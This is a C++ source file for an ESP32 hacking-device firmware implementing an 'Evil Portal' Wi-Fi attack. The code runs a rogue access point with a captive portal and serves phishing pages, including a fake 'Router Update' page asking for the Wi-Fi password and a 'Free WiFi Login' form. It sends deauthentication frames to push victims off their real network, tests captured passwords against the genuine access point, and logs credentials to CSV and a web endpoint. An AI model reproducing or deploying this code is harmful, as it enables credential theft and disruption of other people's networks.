#include "evil_portal.h"
#include "core/config.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_wifi.h"
#include "wifi_atks.h"

EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth,
                       bool verifyPwd)
    : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd),
      webServer(80) {
  if (!setup())
    return;

  beginAP();
  xTaskCreate([](void *p) { ((EvilPortal *)p)->loop(); }, "EvilPortalLoop",
              4096, this, 1, NULL);
};

EvilPortal::~EvilPortal() {
  webServer.end();
  dnsServer.stop();
  vTaskDelay(100 / portTICK_PERIOD_MS);
  wifiDisconnect();
};

void EvilPortal::CaptiveRequestHandler::handleRequest(
    AsyncWebServerRequest *request) {
  String url = request->url();
  if (url == "/")
    _portal->portalController(request);
  else if (url == "/post")
    _portal->credsController(request);
  else if (url == willyConfig.evilPortalEndpoints.getCredsEndpoint &&
           willyConfig.evilPortalEndpoints.allowGetCreds)
    request->send(200, "text/html", _portal->creds_GET());
  else if (url == willyConfig.evilPortalEndpoints.setSsidEndpoint &&
           willyConfig.evilPortalEndpoints.allowSetSsid) {
    if (request->hasArg("ssid")) {
      _portal->apName = request->arg("ssid").c_str();
      request->send(200, "text/html", _portal->ssid_POST());
      _portal->restartWiFi();
    } else {
      request->send(200, "text/html", _portal->ssid_GET());
    }
  } else {
    if (request->args() > 0)
      _portal->credsController(request);
    else
      _portal->portalController(request);
  }
}
bool EvilPortal::setup() {
  options = {{"Html Customizado", [this]() { loadCustomHtml(); }}};
  addOptionToMainMenu();

  if (!_verifyPwd) {
    // Insert Options
    options.insert(options.begin(),
                   {"Padrao", [this]() { loadDefaultHtml(); }});
  } else {
    options.insert(options.begin(),
                   {"Padrao", [this]() { loadDefaultHtml_one(); }});
  }

  loopOptions(options);

  if (returnToMenu)
    return false;

  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  wsl_bypasser_send_raw_frame(
      &ap_record, _channel); // writes the buffer with the information

  if (apName == "") {
    if (willyConfig.evilWifiNames.empty()) {
      apName_from_keyboard();
    } else {
      options = {{"Wifi Customizado", [this]() { apName_from_keyboard(); }}};

      for (const auto &_wifi : willyConfig.evilWifiNames) {
        options.emplace_back(_wifi.c_str(),
                             [this, _wifi]() { this->apName = _wifi; });
      }

      loopOptions(options);
    }
  }

  options = {
      {"172.0.0.1", [this]() { apGateway = IPAddress(172, 0, 0, 1); }},
      {"192.168.4.1", [this]() { apGateway = IPAddress(192, 168, 4, 1); }},
  };

  loopOptions(options);

  Serial.println("Arquivo de saida do Evil Portal: " + outputFile);
  return true;
}

void EvilPortal::beginAP() {
  drawMainBorderWithTitle("EVIL PORTAL");

  displayTextLine("Iniciando...");
  // WIFI_MODE_APSTA captive portal takes time to popup, but is useful for
  // verifying Wifi credentials
  if (_verifyPwd)
    WiFi.mode(WIFI_MODE_APSTA);
  else
    WiFi.mode(WIFI_MODE_AP);
  WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName, emptyString, _channel);
  wifiConnected = true;

  int tmp = millis();
  while (millis() - tmp < 3000)
    yield();

  setupRoutes();
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.begin();
}

bool EvilPortal::verifyCreds(String &Ssid, String &Password) {

  bool isConnected = false;

  // temporary stop deauth if deauth + clone is true
  bool temp = _deauth;
  _deauth = false;
  // Try to connect to wifi
  WiFi.begin(Ssid, Password);

  int i = 1;
  while (WiFi.status() != WL_CONNECTED) {
    if (i > 12)
      break; // 12 times, 6 seconds
    vTaskDelay(500 / portTICK_PERIOD_MS);
    i++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    isConnected = true;
  }

  WiFi.disconnect(false);
  // re enable
  _deauth = temp;

  return isConnected;
}

void EvilPortal::setupRoutes() {
  // this must be done in the handleRequest() function too
  webServer.on("/", [this](AsyncWebServerRequest *request) {
    portalController(request);
  });
  webServer.on("/post", [this](AsyncWebServerRequest *request) {
    credsController(request);
  });
  if (willyConfig.evilPortalEndpoints.allowGetCreds) {
    webServer.on(willyConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
                 [this](AsyncWebServerRequest *request) {
                   request->send(200, "text/html", creds_GET());
                 });
  }
  if (willyConfig.evilPortalEndpoints.allowSetSsid) {
    webServer.on(willyConfig.evilPortalEndpoints.setSsidEndpoint.c_str(),
                 [this](AsyncWebServerRequest *request) {
                   if (request->hasArg("ssid")) {
                     apName = request->arg("ssid").c_str();
                     request->send(200, "text/html", ssid_POST());
                     restartWiFi();
                   } else {
                     request->send(200, "text/html", ssid_GET());
                   }
                 });
  }

  webServer.onNotFound([this](AsyncWebServerRequest *request) {
    if (request->args() > 0)
      credsController(request);
    else
      portalController(request);
  });

  webServer.addHandler(new CaptiveRequestHandler(this))
      .setFilter(ON_AP_FILTER); // only when requested from AP
}

void EvilPortal::restartWiFi(bool reset) {
  webServer.end();
  wifiDisconnect();
  WiFi.softAP(apName);
  webServer.begin();

  // code to handle whether to reset the counter..

  if (reset) {
    resetCapturedCredentials();
  }
}

void EvilPortal::resetCapturedCredentials(void) {
  previousTotalCapturedCredentials = -1; // Reset captured credentials count
}

void EvilPortal::loop() {
  int lastDeauthTime = millis(); // one deauth frame each 30ms at least
  bool shouldRedraw = true;

  while (true) {
    if (shouldRedraw) {
      drawScreen();
      shouldRedraw = false;
    }

    dnsServer.processNextRequest();

    if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
      send_raw_frame(deauth_frame, 26); // Sends deauth frames if needed
      lastDeauthTime = millis();
    }

    if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
      shouldRedraw = true;
      previousTotalCapturedCredentials = totalCapturedCredentials - 1;
    }

    if (check(SelPress)) {
      isDeauthHeld = _deauth ? !isDeauthHeld : isDeauthHeld;
      shouldRedraw = true;
    }

    if (check(EscPress) || returnToMenu)
      break;

    if (verifyPass) {
      wifiDisconnect();
      verifyPass = false;
    }
    vTaskDelay(10 / portTICK_PERIOD_MS); // Prevent watchdog timeout and yield
                                         // to other tasks
  }
  vTaskDelete(NULL); // Delete this task when loop exits
}

void EvilPortal::drawScreen() {
  drawMainBorderWithTitle("EVIL PORTAL");

  String subtitle = "AP: " + apName.substring(0, 30);
  if (apName.length() > 30)
    subtitle += "...";
  printSubtitle(subtitle);

  String apIp = WiFi.softAPIP().toString();
  padprintln("");
  if (willyConfig.evilPortalEndpoints.showEndpoints) {
    if (willyConfig.evilPortalEndpoints.allowGetCreds) {
      padprintln("-> " + apIp +
                 willyConfig.evilPortalEndpoints.getCredsEndpoint +
                 " -> obter creds");
    } else {
      padprintln("-> acesso a creds desabilitado");
    }
    if (willyConfig.evilPortalEndpoints.allowSetSsid) {
      padprintln("-> " + apIp +
                 willyConfig.evilPortalEndpoints.setSsidEndpoint +
                 " -> definir ssid");
    } else {
      padprintln("-> troca de SSID desabilitada");
    }
  } else {
    padprintln("Endpoints ocultos");
  }
  padprintln("");

  if (!_verifyPwd) {
    padprint("Vitimas: " + String(totalCapturedCredentials));
  } else {
    padprint("Tentativas: " + String(totalCapturedCredentials));
  }
  String passMode = "";
  switch (willyConfig.evilPortalPasswordMode) {
  case FULL_PASSWORD:
    passMode = "Completa";
    break;
  case FIRST_LAST_CHAR:
    passMode = "p******d";
    break;
  case HIDE_PASSWORD:
    passMode = "*hidden*";
    break;
  case SAVE_LENGTH:
    passMode = "Length only";
    break;
  }
  padprintln("Modo Senha: " + passMode);
  printLastCapturedCredential();

  printDeauthStatus();
}

void EvilPortal::printLastCapturedCredential() {
  while (lastCred.length()) {
    int newlineIndex = lastCred.indexOf('\n');
    if (newlineIndex > -1) {
      padprintln(lastCred.substring(0, newlineIndex));
      lastCred.remove(0, newlineIndex + 1);
    } else {
      padprint(lastCred);
      lastCred = "";
    }
  }
}

void EvilPortal::printDeauthStatus() {
  if (!_deauth || isDeauthHeld) {
    printFootnote("Deauth DESL");
  } else {
    tft.setTextColor(TFT_RED);
    printFootnote("Deauth LIG");
    tft.setTextColor(willyConfig.priColor);
  }
}

void EvilPortal::loadCustomHtml() {
  getFsStorage(fsHtmlFile);

  htmlFileName = loopSD(*fsHtmlFile, true, "HTML");
  String fileBaseName = htmlFileName.substring(
      htmlFileName.lastIndexOf("/") + 1, htmlFileName.length() - 5);
  fileBaseName.toLowerCase();

  outputFile = fileBaseName + "_creds.csv";
  isDefaultHtml = false;

  // Open the file and read the first line (searching for: <!-- AP="..." -->)
  File htmlFile = fsHtmlFile->open(htmlFileName, FILE_READ);
  if (htmlFile) {
    String firstLine = htmlFile.readStringUntil('\n'); // Read the first line
    htmlFile.close();

    // Look for the AP tag in the first line
    int apStart = firstLine.indexOf("<!-- AP=\"");
    if (apStart != -1) {
      int apEnd = firstLine.indexOf("\" -->", apStart);
      if (apEnd != -1) {
        apName = firstLine.substring(apStart + 9, apEnd); // Extract the AP name
      }
    }
  }
}

String EvilPortal::wifiLoadPage() {
  PROGMEM String wifiLoad =
      "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta "
      "name='viewport' "
      "content='width=device-width, initial-scale=1.0'> </style></head><body> "
      "<div class='container'> <div "
      "class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE "
      "svg PUBLIC '-//W3C//DTD SVG "
      "20010904//EN' "
      "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> "
      "<div> <div> <div "
      "id='logo' title='Wifi' style='display: flex;justify-content: "
      "center;max-width: 50%;margin: auto;'> "
      "<svg fill='#000000' height='800px' width='800px' version='1.1' "
      "id='Capa_1' "
      "xmlns='http://www.w3.org/2000/svg' "
      "xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 365.892 "
      "365.892' xml:space='preserve'> <g> <circle cx='182.945' cy='286.681' "
      "r='41.494'/> <path id='p1' "
      "d='M182.946,176.029c-35.658,0-69.337,17.345-90.09,46.398c-5.921,8.288-4."
      "001,19.806,4.286,25.726 "
      "c3.249,2.321,6.994,3.438,10.704,3.438c5.754,0,11.423-2.686,15.021-7."
      "724c13.846-19.383,36.305-30.954,"
      "60.078-30.954 "
      "c23.775,0,46.233,11.571,60.077,30.953c5.919,8.286,17.437,10.209,25.726,"
      "4.288c8.288-5.92,10.208-17."
      "438,4.288-25.726 C252.285,193.373,218.606,176.029,182.946,176.029z'/> "
      "<path id='p2' "
      "d='M182.946,106.873c-50.938,0-99.694,21.749-133.77,59.67c-6.807,7.576-6."
      "185,19.236,1.392,26.044 "
      "c3.523,3.166,7.929,4.725,12.32,4.725c5.051-0.001,10.082-2.063,13.723-6."
      "116c27.091-30.148,65.849-47."
      "439,106.336-47.439 "
      "s79.246,17.291,106.338,47.438c6.808,7.576,18.468,8.198,26.043,1.391c7."
      "576-6.808,8.198-18.468,1.391-"
      "26.043 C282.641,128.621,233.883,106.873,182.946,106.873z'/> <path "
      "id='p3' "
      "d='M360.611,112.293c-47.209-48.092-110.305-74.577-177.665-74.577c-67."
      "357,0-130.453,26.485-177.664,"
      "74.579 "
      "c-7.135,7.269-7.027,18.944,0.241,26.079c3.59,3.524,8.255,5.282,12.918,5."
      "281c4.776,0,9.551-1.845,13."
      "161-5.522 "
      "c40.22-40.971,93.968-63.534,151.344-63.534c57.379,0,111.127,22.563,151."
      "343,63.532c7.136,7.269,18."
      "812,7.376,26.08,0.242 "
      "C367.637,131.238,367.745,119.562,360.611,112.293z'/> </g> </svg> </div> "
      "</div> </div> </div> <script> const paths = "
      "document.querySelectorAll('path'); let index = 0; "
      "function showNextPath() { if (index < paths.length) { "
      "paths[index].style.display = 'block'; "
      "index++; } } function hideAllPaths() { paths.forEach(path => { "
      "path.style.display = 'none'; }); "
      "index = 0; } hideAllPaths(); setInterval(function() { if (index < "
      "paths.length) { showNextPath(); } "
      "else { hideAllPaths(); } }, 1000); </script></body></html>";
  return wifiLoad;
}

void EvilPortal::loadDefaultHtml_one() {
  htmlPage = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta "
             "name='viewport' "
             "content='width=device-width, initial-scale=1.0'><title>Router "
             "Update</title><style>body "
             "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, "
             "sans-serif;background-color: #d3d3d3; /* Cinza "
             "mais escuro */display: flex;justify-content: center;align-items: "
             "center;height: 100vh;margin: "
             "0;padding: 10px;box-sizing: border-box;}.container "
             "{background-color: white;padding: "
             "20px;border-radius: 10px;box-shadow: 0 0 15px rgba(0, 0, 0, "
             "0.2);text-align: center;max-width: "
             "360px;width: 100%;}.container svg {width: 70px;height: "
             "70px;fill: #ff1744; /* Cor de alerta "
             "*/margin-bottom: 20px;}h1 {color: #333;font-size: "
             "22px;margin-bottom: 15px;}p {color: "
             "#666;font-size: 15px;margin-bottom: 20px;}input[type='password'] "
             "{width: 100%;padding: 12px;margin: "
             "10px 0;border-radius: 5px;border: 1px solid #ccc;font-size: "
             "16px;box-sizing: border-box;}button "
             "{width: 100%;padding: 12px;background-color: #007bff;color: "
             "white;border: none;border-radius: "
             "5px;cursor: pointer;font-size: 16px;transition: background-color "
             "0.3s;}button:hover "
             "{background-color: #0056b3;}div#success-block{display: "
             "none;text-align: center;min-height: "
             "60px;margin-bottom: 30px;justify-content: center;align-items: "
             "center;}</style></head><body><div "
             "class='container'><!-- Ícone No Signal em SVG --><svg "
             "xmlns='http://www.w3.org/2000/svg' "
             "fill='#000000' width='800px' height='800px' viewBox='0 -1 26 "
             "26'><path fill-opacity='.3' d='M24.24 "
             "8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 "
             "15.66.01.02.01-.01L20 "
             "13.28V8h4.24z'/><path d='M22 "
             "22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div "
             "id='form-block'><p>Router firmware update required. Enter your "
             "Wi-Fi password to update.</p><form "
             "id='submit-form' action='/post'><input type='password' "
             "name='password' placeholder='Wi-Fi network "
             "password' required><button "
             "type='submit'>Update</button></form></div><div "
             "id='success-block'><p>The "
             "router will restart in <span id='span-count' style='font-weight: "
             "bolder;'>5</span></p></div></"
             "div><script>document.getElementById('submit-form')."
             "addEventListener('submit', function(event) "
             "{event.preventDefault();document.getElementById('success-block')."
             "style.display = "
             "'flex';document.getElementById('form-block').style.display = "
             "'none';setInterval(function() {index = "
             "parseInt(document.getElementById('span-count').textContent)if "
             "(index > 1) "
             "{document.getElementById('span-count').textContent = "
             "index-1;index--;} else "
             "{document.getElementById('submit-form').submit();}}, "
             "1000);});</script></body></html>";
  outputFile = "default_creds_1.csv";
  isDefaultHtml = true;
}

void EvilPortal::loadDefaultHtml() {
  htmlPage = "<html><body><h1>Free WiFi Login</h1><form action='/post' "
             "method='POST'>SSID: <input name='ssid'><br>Pass: <input "
             "name='password'><br><input type='submit'></form></body></html>";
  outputFile = "default_creds.csv";
  isDefaultHtml = true;
}

void EvilPortal::portalController(AsyncWebServerRequest *request) {
  if (isDefaultHtml)
    request->send(200, "text/html", htmlPage);
  else {
    request->send(*fsHtmlFile, htmlFileName, "text/html");
  }
}

void EvilPortal::credsController(AsyncWebServerRequest *request) {
  String htmlResponse = "<li>";
  String passwordValue = "";
  String csvLine = "";
  String key;
  lastCred = "";

  for (size_t i = 0; i < request->args(); i++) {
    key = request->argName(i);

    if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") ||
        key == "P1" || key == "P2" || key == "P3" || key == "P4") {
      continue;
    }

    // get key if verify and before blanking
    if (key == "password" && _verifyPwd) {
      passwordValue = request->arg(i);
    }

    String valueBuffer = request->arg(i);

    if (key == "password") {
      char blank = '*';
      switch (willyConfig.evilPortalPasswordMode) {
      case FULL_PASSWORD:
        // do nothing, already have full password and want to save it
        break;
      case FIRST_LAST_CHAR:
        // overwrite the middle of the passwordValue with *s
        if (valueBuffer.length() > 2) {
          for (size_t i = 1; i < valueBuffer.length() - 1; i++) {
            valueBuffer[i] = blank;
          }
        }
        // otherwise don't blank anything if pwd is < 2 chars
        break;
      case HIDE_PASSWORD:
        // overwrite the passwordValue with '*hidden*'
        valueBuffer = "*hidden*";
        break;
      case SAVE_LENGTH:
        // overwrite the passwordValue with 'X chars'
        valueBuffer = String(valueBuffer.length()) + " chars";
        break;
      }
    }

    // Build HTML and CSV line
    htmlResponse += key + ": " + valueBuffer + "<br>\n";
    if (i > 0) {
      csvLine += ",";
    }

    // Skip irrelevant parameters

    csvLine += key + ": " + valueBuffer;
    lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
  }

  htmlResponse += "</li>\n";

  if (_verifyPwd && passwordValue != "") {
    request->send(200, "text/html", wifiLoadPage());
    // vTaskDelay(200 / portTICK_PERIOD_MS); // give it time to process the
    // request
    bool isCorrect = verifyCreds(apName, passwordValue);
    if (isCorrect) {

      // Display valid to screen if valid..
      lastCred += "valid: true\nStopping server...";
      saveToCSV(csvLine + ", valid: true", true);
      printDeauthStatus();

      // save to WiFi creds if the pwd was correct.
      if (willyConfig.getWifiPassword(apName) != "") {
        willyConfig.addWifiCredential(apName, passwordValue);
      }
      vTaskDelay(50 / portTICK_PERIOD_MS);
      // stop further actions...
      verifyPass = true;
      _deauth = false;

    } else {
      lastCred += "valid: false";
      // still save invalid creds...
      saveToCSV(csvLine + ", valid: false", true);
      portalController(request);
    }
  } else {
    saveToCSV(csvLine);
    request->send(200, "text/html", wifiLoadPage());
  }

  capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
  totalCapturedCredentials++;
}

String EvilPortal::getHtmlTemplate(String body) {
  char buf[1024];
  snprintf(buf, sizeof(buf),
           "<html><head><title>%s</title></head><body>%s</body></html>",
           apName.c_str(), body.c_str());
  return String(buf);
}

String EvilPortal::creds_GET() {
  return getHtmlTemplate("<ol>" + capturedCredentialsHtml +
                         "</ol><br><center><p><a style=\"color:blue\" "
                         "href=/>Back to Index</a></p><p><a "
                         "style=\"color:blue\" "
                         "href=/clear>Clear passwords</a></p></center>");
}

String EvilPortal::ssid_GET() {
  return getHtmlTemplate(
      "<p>Set a new SSID for Evil Portal:</p><form action='" +
      willyConfig.evilPortalEndpoints.setSsidEndpoint +
      "' id='login-form'><input name='ssid' "
      "class='input-field' type='text' placeholder='" +
      apName +
      "' required><button id=submitbtn class=submit-btn "
      "type=submit>Apply</button></div></form>");
}

String EvilPortal::ssid_POST() {
  return getHtmlTemplate(
      "Evil Portal shutting down and restarting with SSID <b>" + apName +
      "</b>. Please reconnect.");
}

void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
  FS *fs;
  if (!getFsStorage(fs)) {
    log_i("Error getting FS storage");
    return;
  }

  if (!fs) {
    log_e("FS is null");
    return;
  }

  if (!fs->exists("/WillyEvilCreds"))
    fs->mkdir("/WillyEvilCreds");

  File file;

  if (!isAPname) {
    file = fs->open("/WillyEvilCreds/" + outputFile, FILE_APPEND);
  } else {
    file = fs->open("/WillyEvilCreds/" + apName + "_creds.csv", FILE_APPEND);
  }

  if (!file) {
    log_i("Error to open file");
    return;
  }
  file.println(csvLine);
  file.close();
  log_i("data saved");
}

void EvilPortal::apName_from_keyboard() {
  apName = keyboard("Wifi Gratis", 30, "SSID do Evil Portal:");
}
